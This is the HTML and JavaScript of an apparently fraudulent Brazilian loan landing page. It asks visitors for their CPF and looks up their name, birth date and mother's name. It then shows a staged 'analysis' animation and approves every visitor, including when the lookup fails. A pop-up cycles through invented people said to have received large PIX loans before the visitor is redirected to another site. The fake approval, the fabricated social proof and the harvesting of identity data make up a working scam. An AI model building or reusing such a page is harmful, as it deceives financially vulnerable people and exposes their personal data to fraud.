<!DOCTYPE html><html lang="pt-BR"><head>
    <meta name="csrf-token" content="GdNY5mBp1rBeIzzBLQsGayEkTIe7JwRLtOLRua86">
    <title>Empréstimo Seguro - Receba hoje via PIX</title>
    <meta name="description" content="Empréstimo online rápido e seguro. Mesmo com nome sujo ou score baixo. 100% digital, sem taxa.">
    <meta name="keywords" content="emprestimo, fácil, nome sujo, pix">
    <meta name="author" content="Bancred">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#FFFFFF">
    <meta name="apple-mobile-web-app-status-bar-style" content="#FFFFFF">
    <meta name="msapplication-navbutton-color" content="#FFFFFF">
    <link rel="canonical" href="https://bancred.site">
    <meta property="og:image" content="https://bancred.site/public/images/banner.jpg">
    <meta property="og:title" content="Empréstimo Seguro - Receba hoje via PIX">
    <meta property="og:url" content="https://bancred.site">
    <meta property="og:site_name" content="Empréstimo Seguro - Receba hoje via PIX">
    <meta property="og:type" content="website">
    <meta property="og:description" content="Empréstimo online rápido e seguro. Mesmo com nome sujo ou score baixo. 100% digital, sem taxa.">
    <link rel="shortcut icon" href="images/favicon-1.ico">
    <link rel="shortcut icon" href="images/favicon-1.ico">
    <link rel="icon" href="images/favicon-1.ico" sizes="32x32">
    <link rel="icon" href="images/favicon-1.ico" sizes="192x192">
    <link rel="apple-touch-icon" href="images/favicon-1.ico">
    <meta name="msapplication-TileImage" content="https://bancred.site/public/images/favicon.ico">
    <link rel="stylesheet" href="css/global-1.css">
    <script>
        window.pixelId = "6938cbd059dd67439a0a0a4d";
        var a = document.createElement("script");
        a.setAttribute("async", "");
        a.setAttribute("defer", "");
        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
        document.head.appendChild(a);
    </script><script async="" defer="" src="js/pixel.js"></script>
    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
    <script>
        // Capturar e salvar UTMs imediatamente ao carregar a página
        (function() {
            // Função para extrair parâmetros da URL
            function getUrlParams() {
                const params = new URLSearchParams(window.location.search);
                const utmParams = {};
                const allParams = {};
                
                // Capturar todos os parâmetros UTM
                params.forEach((value, key) => {
                    allParams[key] = value;
                    if (key.toLowerCase().startsWith('utm_') || 
                        key.toLowerCase() === 'gclid' || 
                        key.toLowerCase() === 'fbclid' ||
                        key.toLowerCase() === 'ref' ||
                        key.toLowerCase() === 'source') {
                        utmParams[key] = value;
                    }
                });
                
                return { utmParams, allParams, queryString: window.location.search };
            }
            
            // Salvar UTMs no sessionStorage imediatamente
            const { utmParams, allParams, queryString } = getUrlParams();
            
            // Se tiver UTMs na URL, salvar (sobrescreve anteriores)
            if (Object.keys(utmParams).length > 0 || queryString) {
                sessionStorage.setItem('utmParams', JSON.stringify(utmParams));
                sessionStorage.setItem('trackingParams', queryString);
                sessionStorage.setItem('allUrlParams', JSON.stringify(allParams));
                
                console.log('✅ UTMs capturadas e salvas:', utmParams);
                console.log('✅ Query string completa:', queryString);
            } else {
                // Se não tiver na URL, tentar recuperar do sessionStorage
                const savedUtms = sessionStorage.getItem('utmParams');
                const savedQuery = sessionStorage.getItem('trackingParams');
                
                if (savedUtms || savedQuery) {
                    console.log('ℹ️ UTMs recuperadas do sessionStorage:', savedUtms);
                }
            }
        })();
    </script>
</head>
<body data-id="6936e26139b41">
        <div class="min-h-screen flex flex-col">
        <header class="bg-white border-b border-border">
    <div class="container mx-auto px-4 py-5">
        <div class="flex justify-center">
            <div class="text-xl font-bold text-primary flex items-center">
                <div class="mr-3 relative group">
                    <div class="w-8 h-8 border-2 border-primary rounded-full flex items-center justify-center relative overflow-hidden">
                        <div class="w-full h-full bg-primary/10 absolute"></div>
                        <div class="relative z-10 font-bold text-primary text-sm">$</div>
                    </div>
                    <div class="absolute -top-1 -right-1 w-3 h-3 bg-accent rounded-full border-2 border-white"></div>
                </div>Bancred
            </div>
        </div>
    </div>
</header>        <main class="flex-1 bg-muted consulta">
            <section class="py-12 h-full">
                <div class="container mx-auto px-4">
                    <div class="max-w-md mx-auto">
                        <div class="shadcn-card rounded-2xl border bg-card border-card-border text-card-foreground shadow-lg">
                            <div class="flex flex-col space-y-1.5 p-6 text-center pb-6">
                                <div class="w-16 h-16 bg-primary/10 border-2 border-primary/30 rounded-full flex items-center justify-center mx-auto mb-4">
                                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user-check h-8 w-8 text-primary"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><polyline points="16 11 18 13 22 9"></polyline></svg>
                                </div>
                                <div class="tracking-tight text-2xl font-semibold text-foreground">Vamos começar sua análise</div>
                                <p class="text-muted-foreground mt-2">Informe seu CPF para começar</p>
                            </div>
                            <div class="p-6 pt-0">
                                <form class="space-y-6" id="form-cpf">
                                    <div class="space-y-2">
                                        <label class="text-sm font-medium leading-none peer-disabled:cursor-not-allowed peer-disabled:opacity-70" for="cpf">CPF</label>
                                        <input type="text" class="flex h-9 w-full rounded-xl border border-input bg-background px-4 py-6 text-base ring-offset-background file:border-0 file:bg-transparent file:text-sm file:font-medium file:text-foreground placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50 font-medium antialiased" style="text-rendering: optimizelegibility;" id="cpf" placeholder="000.000.000-00" maxlength="14" data-testid="input-cpf" value="">
                                        <p class="mt-2 hidden items-start gap-2 text-sm text-red-600" data-testid="error-message"></p>
                                    </div>
                                    <button class="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-xl text-base focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-ring disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0 hover-elevate active-elevate-2 border border-primary-border min-h-9 px-4 py-3 w-full bg-primary hover:bg-primary/80 text-white font-semibold" type="submit" data-testid="button-continue">Continuar</button>
                                    <div class="mt-4 space-y-1">
                                        <div class="flex items-center gap-2">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-3 w-3 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
                                            <p class="text-xs text-muted-foreground">Seus dados estão protegidos e não serão compartilhados</p>
                                        </div>
                                        <div class="flex items-center gap-2">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-3 w-3 text-green-600"><path d="M20 6 9 17l-5-5"></path></svg>
                                            <p class="text-xs text-muted-foreground">Análise em tempo real sem afetar seu score</p>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </main>
        <main class="flex-1 bg-muted analise hidden">
            <section class="py-12 h-full">
                <div class="container mx-auto px-4">
                    <div class="max-w-md mx-auto">
                        <div class="relative overflow-hidden rounded-2xl bg-gradient-to-br from-blue-50 to-blue-100 p-6 border border-blue-200 shadow-lg">
                            <div class="absolute inset-0 opacity-20">
                                <div class="absolute top-0 left-0 w-full h-full bg-gradient-to-r from-blue-400/20 to-blue-600/20 animate-pulse"></div>
                                <div class="absolute top-0 left-0 w-1/3 h-full bg-gradient-to-r from-white/40 to-transparent transform -skew-x-12 animate-slide"></div>
                            </div>
                            <div class="relative z-10">
                                <div class="text-center mb-6">
                                    <div class="w-16 h-16 mx-auto mb-4 relative">
                                        <div class="absolute inset-0 rounded-full bg-gradient-to-tr from-blue-500 to-blue-700 animate-spin-slow"></div>
                                        <div class="absolute inset-1 rounded-full bg-white flex items-center justify-center">
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-user-check h-6 w-6 text-blue-600 animate-pulse"><path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><polyline points="16 11 18 13 22 9"></polyline></svg>
                                        </div>
                                        <div class="absolute -top-1 left-1/2 w-3 h-3 bg-blue-400 rounded-full animate-ping transform -translate-x-1/2"></div>
                                        <div class="absolute -bottom-1 left-1/2 w-2 h-2 bg-blue-500 rounded-full animate-ping transform -translate-x-1/2" style="animation-delay: 0.5s;"></div>
                                    </div>
                                    <h3 class="text-lg font-bold text-gray-800 mb-2">Analisando seus dados</h3>
                                    <p class="text-sm text-gray-600">Processando informações...</p>
                                </div>
                                <div id="analise" class="space-y-4">
                                    
                                </div>
                                <div class="mt-6 text-center">
                                    <div class="inline-flex items-center gap-2 text-xs text-gray-600 bg-white/60 px-3 py-2 rounded-full">
                                        <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                                        <span>Conexão segura ativa</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
        </main>
        <footer class="bg-gray-900 text-gray-300 py-8 border-t border-gray-800">
    <div class="container mx-auto px-4">
        <div class="text-center space-y-3">
            <div class="text-sm space-y-2">
                <div class="text-gray-400">© 2025 Bancred LTDA. Todos os direitos reservados.</div>
                <div class="text-gray-500">CNPJ 41.906.644/0001-20</div>
                <p class="text-xs text-gray-500 mt-1">Empréstimos rápidos e seguros para realizar seus sonhos</p>
            </div>
        </div>
    </div>
</footer>    </div>
    <div class="fixed bottom-6 left-6 z-50 transition-all duration-500 transform translate-y-full opacity-0" data-testid="live-notification">
        <div class="bg-white rounded-xl shadow-lg border border-gray-200 p-4 max-w-sm">
            <div class="flex items-start gap-3">
                <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center flex-shrink-0">
                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-bell h-5 w-5 text-green-600"><path d="M6 8a6 6 0 0 1 12 0c0 7 3 9 3 9H3s3-2 3-9"></path><path d="M10.3 21a1.94 1.94 0 0 0 3.4 0"></path></svg>
                </div>
                <div class="flex-1 min-w-0">
                    <div class="flex items-baseline gap-1">
                        <h4 class="font-semibold text-gray-900 text-sm truncate">Beatriz F.</h4>
                        <span class="text-xs text-gray-500">de Porto Alegre</span>
                    </div>
                    <p class="text-sm text-gray-600 mb-2">Recebeu via PIX R$ 17.420,00</p>
                    <div class="w-full bg-gray-200 rounded-full h-1.5">
                        <div class="bg-green-500 h-1.5 rounded-full transition-all duration-100 ease-linear"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
<script src="js/jquery.min-1.js"></script>
<script src="js/jquery.mask.min-1.js"></script>
<script src="js/cdn.min-1.js" defer=""></script>
<script>
    const notifications = [
        { name: "Cláudia J.", city: "Goiânia", amount: 17450.00, message: "Recebeu via PIX R$" },
        { name: "Lucas O.", city: "Curitiba", amount: 19800.00, message: "Conseguiu o crédito de R$" },
        { name: "Fernanda L.", city: "Porto Alegre", amount: 22100.00, message: "Foi aprovada e recebeu R$" },
        { name: "Gabriel L.", city: "Manaus", amount: 15600.00, message: "Acabou de receber R$" },
        { name: "Felipe M.", city: "Guarulhos", amount: 13800.00, message: "Conseguiu o crédito de R$" },
        { name: "Tatiane P.", city: "Curitiba", amount: 8700.00, message: "Acabou de receber R$" },
        { name: "Carla S.", city: "Salvador", amount: 21450.00, message: "Foi aprovada e recebeu R$" },
        { name: "Rogério F.", city: "Belo Horizonte", amount: 9400.00, message: "Recebeu via PIX R$" },
        { name: "Patrícia M.", city: "Fortaleza", amount: 11800.00, message: "Conseguiu o crédito de R$" },
        { name: "André R.", city: "São Paulo", amount: 15200.00, message: "Acabou de receber R$" },
        { name: "Vanessa C.", city: "Brasília", amount: 20500.00, message: "Foi aprovada e recebeu R$" },
        { name: "João P.", city: "Recife", amount: 9700.00, message: "Recebeu via PIX R$" },
    ];

    let currentNotification = 0;
    const container = document.querySelector('[data-testid="live-notification"]');
    const nameEl = container.querySelector('h4');
    const cityEl = container.querySelector('span');
    const amountEl = container.querySelector('p');
    const progressEl = container.querySelector('.bg-green-500');

    function formatCurrencyNoti(value) {
        return value.toLocaleString("pt-BR", {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2,
        });
    }

    function showNotification() {
        const n = notifications[currentNotification];

        nameEl.textContent = n.name;
        cityEl.textContent = `de ${n.city}`;
        amountEl.innerHTML = `${n.message} ${formatCurrencyNoti(n.amount)}`;

        container.classList.remove("translate-y-full", "opacity-0");
        container.classList.add("translate-y-0", "opacity-100");

        progressEl.style.transition = "none";
        progressEl.style.width = "100%";
        void progressEl.offsetWidth;

        progressEl.style.transition = "width 5s linear";
        progressEl.style.width = "0%";

        setTimeout(() => {
            container.classList.add("translate-y-full", "opacity-0");
            container.classList.remove("translate-y-0", "opacity-100");
        }, 5000);

        currentNotification = (currentNotification + 1) % notifications.length;
    }

    setTimeout(showNotification, 5000);
    setInterval(showNotification, 15000);
</script>
<script>
    let step1 = `
    <div class="flex items-center gap-4 p-3 rounded-xl transition-all duration-500 bg-white border border-blue-200 shadow-md scale-105">
        <div class="relative w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 bg-blue-500 shadow-lg">
            <div class="relative">
                <svg class="h-5 w-5 animate-spin text-white" fill="none" viewBox="0 0 24 24">
                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"/>
                </svg>
                <div class="absolute inset-0 rounded-full border-2 border-white/30 animate-ping"></div>
            </div>
        </div>
        <div class="flex-1">
            <p class="font-medium transition-colors duration-300 text-blue-700">Consultando banco de dados<span class="ml-2 text-blue-600 animate-pulse">...</span></p>
            <div class="mt-2 w-full bg-blue-100 rounded-full h-1">
                <div class="h-1 bg-blue-500 rounded-full animate-loading-bar"></div>
            </div>
        </div>
        <div class="w-2 h-2 rounded-full transition-all duration-300 bg-blue-400 animate-ping"></div>
    </div>
    <div class="flex items-center gap-4 p-3 rounded-xl transition-all duration-500 bg-gray-50 border border-blue-200 opacity-60">
        <div class="relative w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 bg-gray-300 shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
            class="lucide lucide-loader-circle h-5 w-5 text-white"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
        </div>
        <div class="flex-1">
            <p class="font-medium text-gray-600">Finalizando verificação</p>
        </div>
    </div>`;

    let step2 = `
    <div class="flex items-center gap-4 p-3 rounded-xl transition-all duration-500 bg-green-50 border border-green-200">
        <div class="relative w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 bg-green-500 shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-white animate-bounce-in"><path d="M20 6 9 17l-5-5"></path></svg>
            <div class="absolute inset-0 rounded-full bg-green-400 animate-ping opacity-75"></div>
        </div>
        <div class="flex-1">
            <p class="font-medium transition-colors duration-300 text-green-700">
                Consultando banco de dados<span class="ml-2 inline-flex items-center text-green-600"><span class="animate-bounce-in">✓</span></span>
            </p>
        </div>
        <div class="w-2 h-2 rounded-full transition-all duration-300 bg-green-400 animate-pulse"></div>
    </div>
    <div class="flex items-center gap-4 p-3 rounded-xl transition-all duration-500 bg-white border border-blue-200 shadow-md scale-105">
        <div class="relative w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 bg-blue-500 shadow-lg">
            <div class="relative">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-loader-circle h-5 w-5 text-white animate-spin"><path d="M21 12a9 9 0 1 1-6.219-8.56"></path></svg>
                <div class="absolute inset-0 rounded-full border-2 border-white/30 animate-ping"></div>
            </div>
        </div>
        <div class="flex-1">
            <p class="font-medium transition-colors duration-300 text-blue-700">Finalizando verificação<span class="ml-2 text-blue-600 animate-pulse">...</span></p>
            <div class="mt-2 w-full bg-blue-100 rounded-full h-1">
                <div class="h-1 bg-blue-500 rounded-full animate-loading-bar"></div>
            </div>
        </div>
        <div class="w-2 h-2 rounded-full transition-all duration-300 bg-blue-400 animate-ping"></div>
    </div>`;

    let step3 = `
    <div class="flex items-center gap-4 p-3 rounded-xl transition-all duration-500 bg-green-50 border border-green-200">
        <div class="relative w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 bg-green-500 shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-white animate-bounce-in"><path d="M20 6 9 17l-5-5"></path></svg>
            <div class="absolute inset-0 rounded-full bg-green-400 animate-ping opacity-75"></div>
        </div>
        <div class="flex-1">
            <p class="font-medium transition-colors duration-300 text-green-700">
                Consultando banco de dados<span class="ml-2 inline-flex items-center text-green-600"><span class="animate-bounce-in">✓</span></span>
            </p>
        </div>
        <div class="w-2 h-2 rounded-full transition-all duration-300 bg-green-400 animate-pulse"></div>
    </div>
    <div class="flex items-center gap-4 p-3 rounded-xl transition-all duration-500 bg-green-50 border border-green-200">
        <div class="relative w-10 h-10 rounded-full flex items-center justify-center transition-all duration-500 bg-green-500 shadow-lg">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-check h-5 w-5 text-white animate-bounce-in"><path d="M20 6 9 17l-5-5"></path></svg>
            <div class="absolute inset-0 rounded-full bg-green-400 animate-ping opacity-75"></div>
        </div>
        <div class="flex-1">
            <p class="font-medium transition-colors duration-300 text-green-700">
                Finalizando verificação<span class="ml-2 inline-flex items-center text-green-600"><span class="animate-bounce-in">✓</span></span>
            </p>
        </div>
        <div class="w-2 h-2 rounded-full transition-all duration-300 bg-green-400 animate-pulse"></div>
    </div>`;

    function validarCPF(cpf) {
        cpf = cpf.replace(/\D/g, '');
        if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
        let soma = 0, resto;
        for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        if (resto !== parseInt(cpf[9])) return false;
        soma = 0;
        for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
        resto = (soma * 10) % 11;
        if (resto === 10 || resto === 11) resto = 0;
        return resto === parseInt(cpf[10]);
    }
    $('#cpf').mask('000.000.000-00');

    $('#cpf').on('input', function () {
        $(this).removeClass('border-red-500');
        $('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');
    });

    $(document).on('submit', '#form-cpf', function (e) {
        e.preventDefault();

        $('button[type="submit"]').text('Validando...');

        $('#cpf').removeClass('border-red-500');
        $('p[data-testid="error-message"]').addClass('hidden').removeClass('flex').html('');

        let cpf = $('#cpf').val();
        if(!validarCPF(cpf)){
            $('#cpf').addClass('border-red-500');
            $('p[data-testid="error-message"]').removeClass('hidden').addClass('flex').html(`<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-alert mt-0.5 h-4 w-4 flex-shrink-0"><circle cx="12" cy="12" r="10"></circle><line x1="12" x2="12" y1="8" y2="12"></line><line x1="12" x2="12.01" y1="16" y2="16"></line></svg><span>CPF inválido. Verifique os números digitados.</span>`);
            $('button[type="submit"]').text('Continuar');
            return;
        }

        // Detectar se está rodando localmente ou em produção
        function getApiUrl() {
            const protocol = window.location.protocol;
            const hostname = window.location.hostname;
            const port = window.location.port;
            const isLocal = protocol === 'file:' || 
                          hostname === '' || 
                          hostname === 'localhost' || 
                          hostname === '127.0.0.1' ||
                          hostname.includes('localhost') ||
                          (hostname === '127.0.0.1' && (port === '5500' || port === '3000' || port === '8080'));
            
            console.log('=== DETECÇÃO DE AMBIENTE ===');
            console.log('hostname:', hostname);
            console.log('port:', port);
            console.log('isLocal:', isLocal);
            
            if (isLocal) {
                // Modo local - verificar se está usando XAMPP ou Live Server
                if (port === '5500' || port === '3000' || port === '8080') {
                    // Live Server ou servidor de desenvolvimento na porta
                    const url = window.location.origin + '/consulta/cpf.php';
                    console.log('API URL (Live Server):', url);
                    return url;
                } else {
                    // XAMPP/WAMP - usar caminho relativo baseado na URL atual
                    const currentPath = window.location.pathname;
                    // Extrair o nome da pasta do projeto (bancred.site)
                    const pathParts = currentPath.split('/').filter(p => p);
                    const projectFolder = pathParts[0] || 'bancred.site';
                    const url = window.location.origin + '/' + projectFolder + '/consulta/cpf.php';
                    console.log('API URL (XAMPP):', url);
                    console.log('Pasta do projeto detectada:', projectFolder);
                    return url;
                }
            } else {
                // Modo produção (hospedagem tradicional) - usar caminho completo com .php
                const url = window.location.origin + '/consulta/cpf.php';
                console.log('API URL (produção):', url);
                return url;
            }
        }
        
        // Função para continuar o fluxo com dados simulados
        function continuarComDadosSimulados(cpf) {
            console.warn('⚠️ API não disponível, usando dados simulados para continuar o fluxo');
            console.warn('⚠️ ATENÇÃO: Isso significa que a API não está funcionando corretamente!');
            console.warn('⚠️ Verifique:');
            console.warn('   1. Se o Apache está rodando no XAMPP');
            console.warn('   2. Se o arquivo consulta/cpf.php existe');
            console.warn('   3. Se há erros no console');
            
            // Criar dados simulados baseados no CPF
            const dadosSimulados = {
                cpf: cpf,
                nome: 'Dados não disponíveis',
                nascimento: null,
                situacao: 'Regular',
                status: 'aprovado',
                fonte: 'simulado'
            };
            
            // Salva os dados do usuário no sessionStorage
            console.warn('⚠️ Salvando dados simulados (NÃO são dados reais da API)');
            sessionStorage.setItem("userData", JSON.stringify(dadosSimulados));
            
            // Mostra a tela de análise
            $('.consulta').addClass('hidden');
            $('.analise').removeClass('hidden');
            $('#analise').html(step1);
            
            // Animações em etapas
            setTimeout(() => {
                $('#analise').html(step2);
                setTimeout(() => {
                    $('#analise').html(step3);
                    setTimeout(() => {
                        // Detectar se está local ou produção e redirecionar adequadamente
                        const isLocal = window.location.hostname === 'localhost' || 
                                      window.location.hostname === '127.0.0.1' ||
                                      window.location.protocol === 'file:';
                        
                        let urlPessoa;
                        
                        if (isLocal) {
                            // Modo local - usar caminho relativo
                            const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
                            urlPessoa = basePath + '/pessoa.html/';
                        } else {
                            // Modo produção - usar URL absoluta
                            urlPessoa = "https://com-bancred.vercel.app/pessoa.html/";
                        }
                        
                        console.log('Redirecionando para:', urlPessoa);
                        window.location.href = urlPessoa + window.location.search;
                    }, 600);
                }, 3000);
            }, 3000);
        }
        
        const apiUrl = getApiUrl();
        console.log('=== INICIANDO CHAMADA DA API ===');
        console.log('URL:', apiUrl);
        console.log('CPF enviado:', cpf);
        console.log('Body:', JSON.stringify({ cpf: cpf }));
        
        // Faz a chamada real da API
        fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
            },
            body: JSON.stringify({ cpf: cpf })
        })
        .then(res => {
            console.log('=== RESPOSTA HTTP ===');
            console.log('Status:', res.status, res.statusText);
            console.log('OK:', res.ok);
            
            if (!res.ok) {
                // Se for 404 ou outro erro, tentar ler a resposta antes de usar dados simulados
                if (res.status === 404) {
                    console.error('❌ API não encontrada (404)');
                    console.log('URL tentada:', apiUrl);
                    console.log('Verifique se o arquivo consulta/cpf.php existe no servidor');
                    continuarComDadosSimulados(cpf);
                    return null; // Retornar null para não processar como sucesso
                }
                
                // Tentar ler a mensagem de erro da resposta
                return res.text().then(text => {
                    console.error('❌ Erro na resposta:', text);
                    try {
                        const data = JSON.parse(text);
                        throw new Error(data.message || `Erro HTTP: ${res.status}`);
                    } catch (e) {
                        throw new Error(`Erro HTTP: ${res.status} - ${res.statusText}. Resposta: ${text.substring(0, 200)}`);
                    }
                });
            }
            
            return res.text().then(text => {
                console.log('=== RESPOSTA RAW ===');
                console.log('Texto recebido:', text);
                try {
                    return JSON.parse(text);
                } catch (e) {
                    console.error('❌ Erro ao parsear JSON:', e);
                    console.error('Texto recebido:', text);
                    throw new Error('Resposta da API não é um JSON válido');
                }
            });
        })
        .then(resposta => {
            // Se retornou null (404 tratado), não processar
            if (resposta === null) {
                return;
            }
            
            console.log('=== DADOS RECEBIDOS DA API ===');
            console.log('Resposta completa:', resposta);
            console.log('resposta.success:', resposta.success);
            console.log('resposta.data:', resposta.data);
            
            if (resposta.success && resposta.data) {
                // Verificar se os dados têm conteúdo válido
                const dados = resposta.data;
                console.log('=== VALIDAÇÃO DOS DADOS ===');
                console.log('Nome:', dados.nome || dados.NOME);
                console.log('Nascimento:', dados.nascimento || dados.NASC);
                console.log('Gênero:', dados.sexo || dados.SEXO || dados.genero || dados.GENERO);
                console.log('Mãe:', dados.nome_mae || dados.NOME_MAE || dados.mae || dados.MAE);
                
                // Salva os dados do usuário no sessionStorage
                console.log('Salvando no sessionStorage:', JSON.stringify(dados));
                sessionStorage.setItem("userData", JSON.stringify(dados));
                
                // Verificar se foi salvo corretamente
                const verificar = sessionStorage.getItem("userData");
                console.log('✅ Dados salvos! Verificando...', verificar);
                console.log('Dados parseados:', JSON.parse(verificar));
                
                // Mostra a tela de análise
                $('.consulta').addClass('hidden');
                $('.analise').removeClass('hidden');
                $('#analise').html(step1);
                
                // Animações em etapas
                setTimeout(() => {
                    $('#analise').html(step2);
                    setTimeout(() => {
                        $('#analise').html(step3);
                        setTimeout(() => {
                            // Detectar se está local ou produção e redirecionar adequadamente
                            const isLocal = window.location.hostname === 'localhost' || 
                                          window.location.hostname === '127.0.0.1' ||
                                          window.location.protocol === 'file:';
                            
                            let urlPessoa;
                            
                            if (isLocal) {
                                // Modo local - usar caminho relativo
                                const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/'));
                                urlPessoa = basePath + '/pessoa.html';
                            } else {
                                // Modo produção - usar URL absoluta
                                urlPessoa = "https://com-bancred.vercel.app/pessoa.html/";
                            }
                            
                            console.log('Redirecionando para:', urlPessoa);
                            window.location.href = urlPessoa + window.location.search;
                        }, 600);
                    }, 3000);
                }, 3000);
            } else {
                // Erro retornado pela API - usar dados simulados
                console.log('API retornou erro, continuando com dados simulados');
                continuarComDadosSimulados(cpf);
            }
        })
        .catch(err => {
            // Erro de conexão ou processamento - usar dados simulados
            console.warn('Erro ao conectar com API, continuando com dados simulados:', err.message);
            console.log('URL tentada:', apiUrl);
            
            // Continuar o fluxo mesmo sem a API
            continuarComDadosSimulados(cpf);
        });
    });
</script>
<script defer="" src="vcd15cbe7772f49c399c6a5babf22c1241717689176015-1" data-cf-beacon="{" version":"2024.11.0","token":"b9599e1da994470b9c098e5fca4ee72d","r":1,"server_timing":{"name":{"cfcachestatus":true,"cfedge":true,"cfextpri":true,"cfl4":true,"cforigin":true,"cfspeedbrain":true},"location_startswith":null}}"="" crossorigin="anonymous"></script>

</body></html>
